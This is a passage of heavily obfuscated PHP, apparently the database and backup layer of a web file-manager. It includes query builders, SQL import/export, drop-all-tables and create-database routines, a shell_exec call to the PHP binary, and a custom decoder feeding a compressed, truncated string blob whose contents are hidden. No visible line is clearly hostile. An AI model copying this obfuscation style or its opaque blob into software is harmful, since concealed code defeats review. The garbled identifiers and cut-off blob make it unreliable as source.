$C‹Úğ±Æ’²[$Eğ”„ÁÕ‰Æ[345]] : $Eğ”„ÁÕ‰Æ[33]); return $this->execute($bî’×Ã¥ò, $this->parseBind(!empty($C‹Úğ±Æ’²[$Eğ”„ÁÕ‰Æ[277]]) ? $C‹Úğ±Æ’²[$Eğ”„ÁÕ‰Æ[277]] : array())); } public function delete($F®ŒãÛáª = array()) { $Fßøœ¯ÆÍ =& $_SERVER[…Ò×–]; $this->model = $F®ŒãÛáª[$Fßøœ¯ÆÍ[273]]; $DÈàÔª“Ëà = $Fßøœ¯ÆÍ[961] . $this->parseTable($F®ŒãÛáª[$Fßøœ¯ÆÍ[271]]) . $this->parseWhere(!empty($F®ŒãÛáª[$Fßøœ¯ÆÍ[267]]) ? $F®ŒãÛáª[$Fßøœ¯ÆÍ[267]] : $Fßøœ¯ÆÍ[33]) . $this->parseOrder(!empty($F®ŒãÛáª[$Fßøœ¯ÆÍ[354]]) ? $F®ŒãÛáª[$Fßøœ¯ÆÍ[354]] : $Fßøœ¯ÆÍ[33]) . $this->parseLimit(!empty($F®ŒãÛáª[$Fßøœ¯ÆÍ[284]]) ? $F®ŒãÛáª[$Fßøœ¯ÆÍ[284]] : $Fßøœ¯ÆÍ[33]) . $this->parseLock(isset($F®ŒãÛáª[$Fßøœ¯ÆÍ[776]]) ? $F®ŒãÛáª[$Fßøœ¯ÆÍ[776]] : !1) . $this->parseComment(!empty($F®ŒãÛáª[$Fßøœ¯ÆÍ[345]]) ? $F®ŒãÛáª[$Fßøœ¯ÆÍ[345]] : $Fßøœ¯ÆÍ[33]); return $this->execute($DÈàÔª“Ëà, $this->parseBind(!empty($F®ŒãÛáª[$Fßøœ¯ÆÍ[277]]) ? $F®ŒãÛáª[$Fßøœ¯ÆÍ[277]] : array())); } public function select($cÔõÓñ‰ = array()) { goto E³£»É¥Œ; EßŠÎòËÜ: if ($Fß½×·Ğ¤ && !1 !== $FêÒã×‰) { think_cache($Dì¶¸Â®šé, $FêÒã×‰, $Fß½×·Ğ¤); } return $FêÒã×‰; goto f‘±µÙò‹; E³£»É¥Œ: $CÂ‹‚Á·Êá =& $_SERVER[…Ò×–]; $this->model = $cÔõÓñ‰[$CÂ‹‚Á·Êá[273]]; $A´²ÒÍĞ©« = $this->buildSelectSql($cÔõÓñ‰); goto F‰‹”‘¢îô; F‰‹”‘¢îô: $Fß½×·Ğ¤ = isset($cÔõÓñ‰[$CÂ‹‚Á·Êá[341]]) ? $cÔõÓñ‰[$CÂ‹‚Á·Êá[341]] : !1; if ($Fß½×·Ğ¤) { $Dì¶¸Â®šé = is_string($Fß½×·Ğ¤[$CÂ‹‚Á·Êá[89]]) ? $Fß½×·Ğ¤[$CÂ‹‚Á·Êá[89]] : $CÂ‹‚Á·Êá[962] . md5($A´²ÒÍĞ©«); $aÚ¤À‹ áğ = think_cache($Dì¶¸Â®šé, $CÂ‹‚Á·Êá[33], $Fß½×·Ğ¤); if (!1 !== $aÚ¤À‹ áğ) { return $aÚ¤À‹ áğ; } } $FêÒã×‰ = $this->query($A´²ÒÍĞ©«, $this->parseBind(!empty($cÔõÓñ‰[$CÂ‹‚Á·Êá[277]]) ? $cÔõÓñ‰[$CÂ‹‚Á·Êá[277]] : array())); goto EßŠÎòËÜ; f‘±µÙò‹: } public function buildSelectSql($D–¥¿‚Œİ = array()) { goto EºŒ®Ö¡¾Ô; a÷Â÷ÎäÊ¤: $e†™ÓêòºÂ = $this->parseSql($this->selectSql, $D–¥¿‚Œİ); $e†™ÓêòºÂ .= $this->parseLock(isset($D–¥¿‚Œİ[$e×– ¤‰[776]]) ? $D–¥¿‚Œİ[$e×– ¤‰[776]] : !1); if (isset($cô°‚ĞÛğ±)) { think_cache($cô°‚ĞÛğ±, $e†™ÓêòºÂ); } goto F ÉŠ’Üİ; EºŒ®Ö¡¾Ô: $e×– ¤‰ =& $_SERVER[…Ò×–]; if (isset($D–¥¿‚Œİ[$e×– ¤‰[344]])) { if (strpos($D–¥¿‚Œİ[$e×– ¤‰[344]], $e×– ¤‰[47])) { list($C“ÙÔšÆ›, $EŞ—©½ËêÀ) = explode($e×– ¤‰[47], $D–¥¿‚Œİ[$e×– ¤‰[344]]); } else { $C“ÙÔšÆ› = $D–¥¿‚Œİ[$e×– ¤‰[344]]; } $C“ÙÔšÆ› = $C“ÙÔšÆ› ? $C“ÙÔšÆ› : 1; $EŞ—©½ËêÀ = isset($EŞ—©½ËêÀ) ? $EŞ—©½ËêÀ : (is_numeric($D–¥¿‚Œİ[$e×– ¤‰[284]]) ? $D–¥¿‚Œİ[$e×– ¤‰[284]] : 20); $e™Ëñ¥İÌ± = $EŞ—©½ËêÀ * ((int) $C“ÙÔšÆ› - 1); $D–¥¿‚Œİ[$e×– ¤‰[284]] = $e™Ëñ¥İÌ± . $e×– ¤‰[47] . $EŞ—©½ËêÀ; } if (think_config($e×– ¤‰[963])) { $cô°‚ĞÛğ± = $e×– ¤‰[964] . md5(serialize($D–¥¿‚Œİ)); $b™¼ë‹ßîä = think_cache($cô°‚ĞÛğ±); if ($b™¼ë‹ßîä) { return $b™¼ë‹ßîä; } } goto a÷Â÷ÎäÊ¤; F ÉŠ’Üİ: return $e†™ÓêòºÂ; goto e´´ÂƒÔ; e´´ÂƒÔ: } public function parseSql($D…Û¶„ÈÄ‡, $fŸ¨Ó°Ñïµ = array()) { $D¾Âš¾Á‚ =& $_SERVER[…Ò×–]; $D…Û¶„ÈÄ‡ = str_replace(array($D¾Âš¾Á‚[965], $D¾Âš¾Á‚[966], $D¾Âš¾Á‚[967], $D¾Âš¾Á‚[968], $D¾Âš¾Á‚[969], $D¾Âš¾Á‚[970], $D¾Âš¾Á‚[971], $D¾Âš¾Á‚[972], $D¾Âš¾Á‚[973], $D¾Âš¾Á‚[974], $D¾Âš¾Á‚[975]), array($this->parseTable("{$fŸ¨Ó°Ñïµ[$D¾Âš¾Á‚[271]]}"), $this->parseDistinct(isset($fŸ¨Ó°Ñïµ[$D¾Âš¾Á‚[976]]) ? $fŸ¨Ó°Ñïµ[$D¾Âš¾Á‚[976]] : !1), $this->parseField(!empty($fŸ¨Ó°Ñïµ[$D¾Âš¾Á‚[265]]) ? $fŸ¨Ó°Ñïµ[$D¾Âš¾Á‚[265]] : $D¾Âš¾Á‚[180]), $this->parseJoin(!empty($fŸ¨Ó°Ñïµ[$D¾Âš¾Á‚[274]]) ? $fŸ¨Ó°Ñïµ[$D¾Âš¾Á‚[274]] : $D¾Âš¾Á‚[33]), $this->parseWhere(!empty($fŸ¨Ó°Ñïµ[$D¾Âš¾Á‚[267]]) ? $fŸ¨Ó°Ñïµ[$D¾Âš¾Á‚[267]] : $D¾Âš¾Á‚[33]), $this->parseGroup(!empty($fŸ¨Ó°Ñïµ[$D¾Âš¾Á‚[977]]) ? $fŸ¨Ó°Ñïµ[$D¾Âš¾Á‚[977]] : $D¾Âš¾Á‚[33]), $this->parseHaving(!empty($fŸ¨Ó°Ñïµ[$D¾Âš¾Á‚[978]]) ? $fŸ¨Ó°Ñïµ[$D¾Âš¾Á‚[978]] : $D¾Âš¾Á‚[33]), $this->parseOrder(!empty($fŸ¨Ó°Ñïµ[$D¾Âš¾Á‚[354]]) ? $fŸ¨Ó°Ñïµ[$D¾Âš¾Á‚[354]] : $D¾Âš¾Á‚[33]), $this->parseLimit(!empty($fŸ¨Ó°Ñïµ[$D¾Âš¾Á‚[284]]) ? $fŸ¨Ó°Ñïµ[$D¾Âš¾Á‚[284]] : $D¾Âš¾Á‚[33]), $this->parseUnion(!empty($fŸ¨Ó°Ñïµ[$D¾Âš¾Á‚[339]]) ? $fŸ¨Ó°Ñïµ[$D¾Âš¾Á‚[339]] : $D¾Âš¾Á‚[33]), $this->parseComment(!empty($fŸ¨Ó°Ñïµ[$D¾Âš¾Á‚[345]]) ? $fŸ¨Ó°Ñïµ[$D¾Âš¾Á‚[345]] : $D¾Âš¾Á‚[33])), $D…Û¶„ÈÄ‡); return $D…Û¶„ÈÄ‡; } public function getLastSql($cêÉ”£Íé = '') { return $cêÉ”£Íé ? $this->modelSql[$cêÉ”£Íé] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($fóâ¹òÃŸÒ) { return addslashes($fóâ¹òÃŸÒ); } public function setModel($d•­–¦¿¿Ú) { $this->model = $d•­–¦¿¿Ú; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($A÷Ÿ³Ê‡ Œ, $Bòôš¸ê¢œ = '') { $this->database = $A÷Ÿ³Ê‡ Œ; $this->type = $Bòôš¸ê¢œ; } public function model($Eïèàã”×ù = '') { return new ModelBase($Eïèàã”×ù, $_SERVER[…Ò×–][33], $this->database); } public function db($cé¼çéÀñ = false) { goto f‰™¾Ğğ¥ƒ; f‰™¾Ğğ¥ƒ: $CÎ³»Í†êŞ =& $_SERVER[…Ò×–]; $A»†°ªÒ¦Ê = array_change_key_case($this->database); if ($this->type == $CÎ³»Í†êŞ[9] || !$cé¼çéÀñ) { return $this->model()->db(); } goto b–ˆšõÃÇ÷; eì¾«¸Ø¡ì: $this->database = $A»†°ªÒ¦Ê; $fµ‘”— = $this->model()->db(); try { $Cíºö…º¥  = $fµ‘”—->execute("\163\150\x6f\x77\40\144\x61\x74\x61\x62\141\163\145\x73\x20\154\x69\153\145\40\x27{$bç«…ƒï˜Å}\47"); } catch (Exception $bÆÉ¼¢åÖ¹) { } goto C·–Õ³éïß; b–ˆšõÃÇ÷: $bç«…ƒï˜Å = $A»†°ªÒ¦Ê[$CÎ³»Í†êŞ[891]]; $A»†°ªÒ¦Ê[$CÎ³»Í†êŞ[891]] = $CÎ³»Í†êŞ[33]; if ($A»†°ªÒ¦Ê[$CÎ³»Í†êŞ[727]] == $CÎ³»Í†êŞ[728]) { $e·ĞÖôä = $A»†°ªÒ¦Ê[$CÎ³»Í†êŞ[729]]; $A»†°ªÒ¦Ê[$CÎ³»Í†êŞ[729]] = substr($e·ĞÖôä, 0, strrpos($e·ĞÖôä, $CÎ³»Í†êŞ[979])); } goto eì¾«¸Ø¡ì; C·–Õ³éïß: if (!$Cíºö…º¥ ) { $fµ‘”—->execute("\x63\162\x65\x61\x74\145\40\x64\x61\164\x61\142\x61\163\x65\x20\x60{$bç«…ƒï˜Å}\140"); } $A»†°ªÒ¦Ê[$CÎ³»Í†êŞ[891]] = $bç«…ƒï˜Å; if ($A»†°ªÒ¦Ê[$CÎ³»Í†êŞ[727]] == $CÎ³»Í†êŞ[728]) { $A»†°ªÒ¦Ê[$CÎ³»Í†êŞ[729]] .= $CÎ³»Í†êŞ[979] . $bç«…ƒï˜Å; } goto b÷×¬Ë°»‘; b÷×¬Ë°»‘: $this->database = $A»†°ªÒ¦Ê; $fµ‘”—->execute("\x75\x73\x65\x20\140{$bç«…ƒï˜Å}\140"); return $fµ‘”—; goto e¸à‚Õ”ô»; e¸à‚Õ”ô»: } public function createTable($dªÙÅšËù, $aï­êİª´¾ = null) { $C¾£ÏíÍÖø =& $_SERVER[…Ò×–]; if (!IO::exist($dªÙÅšËù)) { ActionCall($C¾£ÏíÍÖø[980], !0, 0); show_json(LNG($C¾£ÏíÍÖø[981]), !1); } $B¥­™ßÃ© = sqlSplit(IO::getContent($dªÙÅšËù)); foreach ($B¥­™ßÃ© as $AÆÇØ’¡‡‡) { if ($aï­êİª´¾) { $F˜¸ˆ’Íá = stripos($AÆÇØ’¡‡‡, $C¾£ÏíÍÖø[982]) === 0; if ($F˜¸ˆ’Íá) { $aï­êİª´¾->task[$C¾£ÏíÍÖø[983]] += 1; } } $this->model()->db()->execute($AÆÇØ’¡‡‡); if ($aï­êİª´¾ && $F˜¸ˆ’Íá) { preg_match($C¾£ÏíÍÖø[984], $AÆÇØ’¡‡‡, $CÁ½ó¡ª†); $aï­êİª´¾->task[$C¾£ÏíÍÖø[985]] = $CÁ½ó¡ª†[1]; $aï­êİª´¾->update(1); } } $this->taskToCache($aï­êİª´¾); } public function insertTable($dáËÓˆ’Å, $e‘Ù›ŞŒ³Ş = null) { $dõĞãº•Üç =& $_SERVER[…Ò×–]; $EÉ‡ó›Ü‚¾ = $this->model()->db(); $A¾ˆĞÊÙÑå = $A¯Û›×‰Ÿ ? array($A¯Û›×‰Ÿ) : $EÉ‡ó›Ü‚¾->getTables(); foreach ($dáËÓˆ’Å as $A÷¹ò‚¾¾˜) { $A¯Û›×‰Ÿ = basename($A÷¹ò‚¾¾˜, $dõĞãº•Üç[722]); if (!in_array($A¯Û›×‰Ÿ, $A¾ˆĞÊÙÑå)) { continue; } if ($e‘Ù›ŞŒ³Ş) { $e‘Ù›ŞŒ³Ş->task[$dõĞãº•Üç[985]] = $A¯Û›×‰Ÿ; } if (get_filesize($A÷¹ò‚¾¾˜) == 0) { continue; } $EÉ¬º¹¤ëé = $this->sqlToDb($A÷¹ò‚¾¾˜, $e‘Ù›ŞŒ³Ş); if (!$EÉ¬º¹¤ëé) { ActionCall($dõĞãº•Üç[980], !0, 0); show_json(LNG($dõĞãº•Üç[986]) . "\x5b{$A¯Û›×‰Ÿ}\x5d", !1); } } $this->taskToCache($e‘Ù›ŞŒ³Ş); } public function sqlFromDb($fØÓÁ¿Ê™Œ, $fÄùğ‚®­Â, $f½°¥›’Ø“ = null, $cë·¨ôØÀæ = null) { goto cìİÜì—ôù; fÛÊ©Êç‹: fclose($dŞğÒ•¤¯); return $D½¥²¦É¾; goto F»®ŸÉ­èæ; B©–ïŒêË: $d‚Å³¡ÉåÁ = $B÷Š·Á´Šå->getPk(); $E‡”ö–îÍí = $B÷Š·Á´Šå->getDbFields(); do { $b÷¯©ˆŠÕˆ = $B÷Š·Á´Šå->field($E‡”ö–îÍí)->order($d‚Å³¡ÉåÁ . $_SERVER[…Ò×–][988])->selectPage($F©Ò½„å»¬, $Eî†³³ºÇ·); $CÖœËË‡ = isset($b÷¯©ˆŠÕˆ[$_SERVER[…Ò×–][355]][$_SERVER[…Ò×–][357]]) ? $b÷¯©ˆŠÕˆ[$_SERVER[…Ò×–][355]][$_SERVER[…Ò×–][357]] : 0; $f‚ÇàªòİÏ = !empty($b÷¯©ˆŠÕˆ[$_SERVER[…Ò×–][358]]) ? $b÷¯©ˆŠÕˆ[$_SERVER[…Ò×–][358]] : array(); if (!($f‹›ÊŒ§¬ = count($f‚ÇàªòİÏ))) { break; } $DâÖé´‚´Á = array(); foreach ($f‚ÇàªòİÏ as $b±¨ß®ˆ§) { if ($fØÓÁ¿Ê™Œ == $_SERVER[…Ò×–][989] && $b±¨ß®ˆ§[$_SERVER[…Ò×–][29]] == $_SERVER[…Ò×–][990]) { $FÓââİß«Ó = json_decode($b±¨ß®ˆ§[$_SERVER[…Ò×–][363]], !0); if ($FÓââİß«Ó[$_SERVER[…Ò×–][28]] == date($_SERVER[…Ò×–][695]) && !$FÓââİß«Ó[$_SERVER[…Ò×–][694]]) { continue; } } if ($cë·¨ôØÀæ) { $b±¨ß®ˆ§[$_SERVER[…Ò×–][75]] = "\x7b\151\x6f\72{$cë·¨ôØÀæ}\x7d" . substr($b±¨ß®ˆ§[$_SERVER[…Ò×–][75]], strlen("\173\151\157\72{$b±¨ß®ˆ§[$_SERVER[…Ò×–][748]]}\175")); $b±¨ß®ˆ§[$_SERVER[…Ò×–][748]] = $cë·¨ôØÀæ; } $DâÖé´‚´Á[] = $_SERVER[…Ò×–][991] . $this->sqlEncode($b±¨ß®ˆ§) . $_SERVER[…Ò×–][992]; } $CùÁ§íŞ£Ğ = "\x49\x4e\123\x45\122\x54\x20\x49\x4e\x54\117\40\x60{$fØÓÁ¿Ê™Œ}\x60\x20\x28\140" . implode($_SERVER[…Ò×–][993], $E‡”ö–îÍí) . $_SERVER[…Ò×–][994]; fwrite($dŞğÒ•¤¯, $CùÁ§íŞ£Ğ . implode($_SERVER[…Ò×–][995], $DâÖé´‚´Á) . $_SERVER[…Ò×–][67] . PHP_EOL); $Eî†³³ºÇ·++; $D½¥²¦É¾ += $f‹›ÊŒ§¬; if ($f½°¥›’Ø“) { $f½°¥›’Ø“->update($f‹›ÊŒ§¬); } } while ($Eî†³³ºÇ· <= $CÖœËË‡); goto fÛÊ©Êç‹; B‚‚éÄÖ±: $Eî†³³ºÇ· = 1; $F©Ò½„å»¬ = 500; $dŞğÒ•¤¯ = fopen($fÄùğ‚®­Â, $_SERVER[…Ò×–][987]); goto B©–ïŒêË; cìİÜì—ôù: if ($f½°¥›’Ø“) { $f½°¥›’Ø“->task[$_SERVER[…Ò×–][985]] = $fØÓÁ¿Ê™Œ; } $B÷Š·Á´Šå = $this->model($fØÓÁ¿Ê™Œ); $D½¥²¦É¾ = 0; goto B‚‚éÄÖ±; F»®ŸÉ­èæ: } public function sqlToDb($eÆ¦ğ¾“›„, $a„™¾ÑèÈÇ = null) { goto aô®ã£ÁõÜ; aô®ã£ÁõÜ: $F£İƒƒµºÄ =& $_SERVER[…Ò×–]; $f×Çˆ†„ùä = $this->model()->db(); $B¯ÚŒéª² = @fopen($eÆ¦ğ¾“›„, $F£İƒƒµºÄ[996]); goto Eá×ÈŠ‹Òò; e²İ¤ÇÏ™Ù: if (trim($dµÂÔÅ”)) { $dµÂÔÅ” = rtrim(trim($dµÂÔÅ”), $F£İƒƒµºÄ[67]); if (!$f×Çˆ†„ùä->execute($dµÂÔÅ”)) { return !1; } if ($a„™¾ÑèÈÇ) { $a„™¾ÑèÈÇ->update($eŠñÜËÂ‰ğ - 1); } } return !0; goto fÊİÅ’Ş«‡; Eá×ÈŠ‹Òò: if (!$B¯ÚŒéª²) { return !1; } $eŠñÜËÂ‰ğ = 0; $dµÂÔÅ” = $F£İƒƒµºÄ[33]; goto Cù»À’È²ó; Cù»À’È²ó: $EÎøÍœ¼» = 500 + 1; while (!feof($B¯ÚŒéª²)) { if ($a„™¾ÑèÈÇ && $eŠñÜËÂ‰ğ != 0) { $a„™¾ÑèÈÇ->task[$F£İƒƒµºÄ[983]] += 1; } $eŠñÜËÂ‰ğ++; $d‡¸§‚µˆœ = trim(fgets($B¯ÚŒéª²)); $dµÂÔÅ” .= $F£İƒƒµºÄ[50] . $this->sqlDecode($d‡¸§‚µˆœ, $this->type); if ($eŠñÜËÂ‰ğ == $EÎøÍœ¼») { $dµÂÔÅ” = rtrim(trim($dµÂÔÅ”), $F£İƒƒµºÄ[67]); if (!$f×Çˆ†„ùä->execute($dµÂÔÅ”)) { return !1; } if ($a„™¾ÑèÈÇ) { $a„™¾ÑèÈÇ->update($eŠñÜËÂ‰ğ - 1); } $dµÂÔÅ” = $F£İƒƒµºÄ[33]; $eŠñÜËÂ‰ğ = 0; } } fclose($B¯ÚŒéª²); goto e²İ¤ÇÏ™Ù; fÊİÅ’Ş«‡: } public function dropTable($Bñ“ƒÒ·ÈÆ = null) { $aÚĞœ„Š¿– = $this->model()->db(); $F´—¯Ê… = $Bñ“ƒÒ·ÈÆ ? array($Bñ“ƒÒ·ÈÆ) : $aÚĞœ„Š¿–->getTables(); if (!$F´—¯Ê…) { return; } foreach ($F´—¯Ê… as $Bñ“ƒÒ·ÈÆ) { $aÚĞœ„Š¿–->execute("\x64\162\x6f\x70\40\x74\141\142\x6c\x65\x20\151\146\40\x65\170\151\163\x74\x73\x20\x60{$Bñ“ƒÒ·ÈÆ}\140"); } } private function taskToCache($FÅ¤‰¥²ƒ¥ = null) { $aÙ™‘ŞŠ„ =& $_SERVER[…Ò×–]; if (!$FÅ¤‰¥²ƒ¥) { return; } $A¡©ó„˜øî = array($aÙ™‘ŞŠ„[985] => $FÅ¤‰¥²ƒ¥->task[$aÙ™‘ŞŠ„[985]], $aÙ™‘ŞŠ„[983] => $FÅ¤‰¥²ƒ¥->task[$aÙ™‘ŞŠ„[983]], $aÙ™‘ŞŠ„[997] => $FÅ¤‰¥²ƒ¥->task[$aÙ™‘ŞŠ„[997]]); if ($A¡©ó„˜øî[$aÙ™‘ŞŠ„[983]] == $A¡©ó„˜øî[$aÙ™‘ŞŠ„[997]]) { $A¡©ó„˜øî[$aÙ™‘ŞŠ„[701]] = 1; } Cache::set($aÙ™‘ŞŠ„[998] . $FÅ¤‰¥²ƒ¥->task[$aÙ™‘ŞŠ„[371]], $A¡©ó„˜øî); $FÅ¤‰¥²ƒ¥->end(); } private function sqlEncode($f¢×“ô÷¤§) { $b‘øÀÒ¸’ =& $_SERVER[…Ò×–]; $a‰Ã±Ÿ‰Çª = array(); foreach ($f¢×“ô÷¤§ as $c¬ƒÙõõ³é) { if (is_array($c¬ƒÙõõ³é)) { $c¬ƒÙõõ³é = json_encode_force($c¬ƒÙõõ³é); } $c¬ƒÙõõ³é = addslashes($c¬ƒÙõõ³é); $c¬ƒÙõõ³é = str_replace(array($b‘øÀÒ¸’[999], $b‘øÀÒ¸’[221]), array($b‘øÀÒ¸’[1000], $b‘øÀÒ¸’[1001]), $c¬ƒÙõõ³é); $a‰Ã±Ÿ‰Çª[] = str_replace($b‘øÀÒ¸’[55], $b‘øÀÒ¸’[1002], $c¬ƒÙõõ³é); } return $b‘øÀÒ¸’[55] . implode($b‘øÀÒ¸’[1003], $a‰Ã±Ÿ‰Çª) . $b‘øÀÒ¸’[55]; } private function sqlDecode($f³ƒÄœÛ£†, $aíîÇ ôµ›) { $eêšäî‘õö =& $_SERVER[…Ò×–]; $f³ƒÄœÛ£† = str_replace(array($eêšäî‘õö[1000], $eêšäî‘õö[1001]), array($eêšäî‘õö[999], $eêšäî‘õö[221]), $f³ƒÄœÛ£†); if ($aíîÇ ôµ› == $eêšäî‘õö[9]) { $f³ƒÄœÛ£† = stripslashes($f³ƒÄœÛ£†); } return $f³ƒÄœÛ£†; } } goto fÙ‡ŒÀ„Ôø; f™±«öÄ: function ActionCall($AëÂÆôªÉ’) { $aí›ÉÈĞ‚Ó = array_slice(func_get_args(), 1); return ActionApply($AëÂÆôªÉ’, $aí›ÉÈĞ‚Ó); } function ActionCallApi($aè¨‚·’Êİ, $eÛ±†…„Åë = '') { goto CŸÀµ°â¿ˆ; e Ì±Ÿ¨Ó¦: $eøîÓ­‰Ê™ = json_decode($BŒ‰Ì¾Œí¦, !0); $f¥Ë½¾Ÿ”¹ = is_array($eøîÓ­‰Ê™) ? $eøîÓ­‰Ê™ : array($Cùè½ÀÚ¿[29] => null, $Cùè½ÀÚ¿[30] => $BŒ‰Ì¾Œí¦); if (!$eøîÓ­‰Ê™) { echo $BŒ‰Ì¾Œí¦; } goto FìÜ‹Äç˜•; CŸÀµ°â¿ˆ: $Cùè½ÀÚ¿ =& $_SERVER[ä¡—±€µó–è]; $bß÷‡¿ñ‹ß = $eÛ±†…„Åë; if (is_array($eÛ±†…„Åë)) { $bß÷‡¿ñ‹ß = $Cùè½ÀÚ¿[16]; foreach ($eÛ±†…„Åë as $Bæ‰­îáÂá => $cÈãÚ†µİ«) { $cÈãÚ†µİ« = is_array($cÈãÚ†µİ«) ? json_encode($cÈãÚ†µİ«) : $cÈãÚ†µİ«; $cÈãÚ†µİ« = is_bool($cÈãÚ†µİ«) ? intval($cÈãÚ†µİ«) : $cÈãÚ†µİ«; $bß÷‡¿ñ‹ß .= $Cùè½ÀÚ¿[17] . $Bæ‰­îáÂá . $Cùè½ÀÚ¿[18] . rawurlencode($cÈãÚ†µİ«); } } goto EŒ¦¹¿ï; FìÜ‹Äç˜•: return $f¥Ë½¾Ÿ”¹; goto eÖ°Ó„²Àª; d¼¥¢¼÷: $Cß¯¹­×ˆ = phpBinCommand(); if ($Cß¯¹­×ˆ && function_exists($Cùè½ÀÚ¿[21])) { $F–‰Øö¯ï = $Cß¯¹­×ˆ . $Cùè½ÀÚ¿[22] . BASIC_PATH . $Cùè½ÀÚ¿[23] . escapeshellarg($aè¨‚·’Êİ); $BŒ‰Ì¾Œí¦ = shell_exec($F–‰Øö¯ï); } if (!$BŒ‰Ì¾Œí¦) { $fŞ‹å¿áâ = stream_context_create(array($Cùè½ÀÚ¿[24] => array($Cùè½ÀÚ¿[25] => 20, $Cùè½ÀÚ¿[26] => $Cùè½ÀÚ¿[27]))); $BŒ‰Ì¾Œí¦ = file_get_contents(APP_HOST . $Cùè½ÀÚ¿[28] . $aè¨‚·’Êİ, !1, $fŞ‹å¿áâ); } goto e Ì±Ÿ¨Ó¦; EŒ¦¹¿ï: $eš¡Ó†¶÷ = Action($Cùè½ÀÚ¿[19])->accessToken(); $aè¨‚·’Êİ = str_replace($Cùè½ÀÚ¿[5], $Cùè½ÀÚ¿[4], $aè¨‚·’Êİ) . $Cùè½ÀÚ¿[20] . $eš¡Ó†¶÷ . $bß÷‡¿ñ‹ß; $BŒ‰Ì¾Œí¦ = $Cùè½ÀÚ¿[16]; goto d¼¥¢¼÷; eÖ°Ó„²Àª: } function ActionCallHook($a‡¥‘òã¦í) { goto EğŠÆöò‚•; b×‘ì˜‘Ÿ: $c†‰½ô×Ï = $b¡¸ö²Ö‡• ? json_decode($b¡¸ö²Ö‡•, !0) : $c†‰½ô×Ï; $GLOBALS[$fª™ÛÃ¦¦¸[31]] = 0; return $c†‰½ô×Ï; goto AØ³ÒèÉ›; EğŠÆöò‚•: $fª™ÛÃ¦¦¸ =& $_SERVER[ä¡—±€µó–è]; ob_start(); $aÔ°ëõ£ìÛ = array_slice(func_get_args(), 1); goto cÕÖÇ‘Á¶Ä; cÕÖÇ‘Á¶Ä: $GLOBALS[$fª™ÛÃ¦¦¸[31]] = 1; $c†‰½ô×Ï = ActionApply($a‡¥‘òã¦í, $aÔ°ëõ£ìÛ); $b¡¸ö²Ö‡• = ob_get_clean(); goto b×‘ì˜‘Ÿ; AØ³ÒèÉ›: } goto cºˆÎÆ’; EÀ—ÒĞ÷Õ: if (!function_exists('_kodDe')) { function _kodDe($AÂÃ—Äà®œ) { $AÂÃ—Äà®œ = base64_decode($AÂÃ—Äà®œ); $Eğá—À’èÇ = strlen($AÂÃ—Äà®œ); $E´ÎšŒÉª» = ''; $d¸‚Òµ¶­ = ord($AÂÃ—Äà®œ[0]) - 30; for ($B„Õ²ØÇ¿ = 1; $B„Õ²ØÇ¿ < $Eğá—À’èÇ; $B„Õ²ØÇ¿ += 2) { if ($B„Õ²ØÇ¿ + 1 < $Eğá—À’èÇ) { $E´ÎšŒÉª» .= chr(ord($AÂÃ—Äà®œ[$B„Õ²ØÇ¿ + 1]) + $d¸‚Òµ¶­); $E´ÎšŒÉª» .= chr(ord($AÂÃ—Äà®œ[$B„Õ²ØÇ¿]) + $d¸‚Òµ¶­); } else { $E´ÎšŒÉª» .= chr(ord($AÂÃ—Äà®œ[$B„Õ²ØÇ¿]) + $d¸‚Òµ¶­); } } return $E´ÎšŒÉª»; } } define("\x85\xd2\xd7\x96", "\301"); $_SERVER[…Ò×–] = explode("\x7c\x2\x7c\x2\x7c\x5", gzinflate(substr("\37\213\10\0\0\0\0\0\0\3\235\75\11\140\33\305\265\24\112\33\2\241\320\122\256\162\154\34\202\217\350\360\25\47\161\342\44\262\45\333\42\266\245\110\162\234\304\162\224\225\264\222\66\226\264\362\356\312"."\107\342\120\216\22\40\224\24\312\115\271\102\41\120\110\111\240\334\20\216\26\10\120\240\34\345\206\162\46\341\50\167\41\345\152\377\334\63\273\222\151\373\151\35\315\274\171\63\73\307\233\67\157\146\336\173\363\366"."\xc6\xb\x6e\x3c\xe1\x96\xcf\xce\x7f\x67\x7c\x4f\xf0\xbf\xbd\xdf\x7e\x62\xc3\xfb\xe7\xbf\xb1\x6d\xfd\x3a\x1c\x1d\xff\x3e\xfa\x43\xe1\xa3\xcf\x98\xb4\x7\xfa\x6f\xaf\xdc\xe2\x3f\xe7\xff\x58\x7b\xc0\xdd\x4f\x2e\xba\xf7\xa4\x70\xe0\xa7"."\x9d\xdb\x7e\x3b\x79\xb2\xf3\x77\xcb\x4f\xba\xf8\xda\x13\x57\x38\x12\xee\x7\xfe\x38\xea\x7c\x79\xf1\xe2\x7\xb7\xcf\x52\xa6\xf8\xf\xbc\xe0\xb1\x5f\xbe\xf9\xe2\x76\xc7\x5c\x73\xff\x59\xa7\x3e\x31\xf7\xb8\x27\xbd\x7b\x5f\x7c\xcb\x4b"."\7\134\60\357\343\237\356\136\170\135\340\311\151\133\357\174\251\252\155\374\157\157\276\362\322\145\116\347\351\3\341\335\235\201\351\277\330\371\267\131\177\171\357\262\373\67\76\367\372\127\377\356\37\270\173\257\135\117"."\36\170\365\107\107\336\177\302\25\237\276\276\372\321\316\27\266\337\33\235\364\361\374\355\316\13\377\371\300\5\127\314\74\271\145\322\323\3\47\375\366\335\55\201\277\52\223\156\124\202\163\357\253\171\340\110\351\334".base64_decode('qtPv7fp034/eUg/bp3v8gZvU5Vufd1x647KL//BIxel/++nmpzxLlnjeHNmv0PjYryubjt4Zflp75A==').base64_decode('tDPP+dGP/1L0v3pp45yDXjlMeXPbTa+fe9ofnqitOvCHh51clEZPmP11y/3O7701ePUb49vmb9lz1Q==')."\333\67\75\362\355\240\374\373\321\177\376\343\356\245\373\277\164\131\327\267\367\335\342\133\376\331\330\244\342\53\173\146\203\231\245\217\234\271\171\313\370\343\306\53\233\225\154\363\61\165\27\72\217\73\145\227\357\304"."\217\46\367\375\152\137\227\377\347\337\333\274\375\203\231\17\355\271\307\36\270\177\233\361\217\224\327\114\111\31\125\15\323\300\200\204\226\117\251\151\34\126\363\370\327\215\177\214\241\254\152\52\70\34\353\11\104\142"."\xe1\xde\x60\xd0\x17\x8a\xc4\x48\x89\x62\x7a\x4e\x4b\x92\x50\x41\xd6\xe5\x1c\x29\xbc\xa0\xe8\x6\xf8\x94\x58\x5c\xac\xa0\x15\x94\xbc\x5\xc2\x1\x49\xd9\x94\xe3\xb2\x41\x4a\xf2\xb6\xc6\xbc\xbe\x60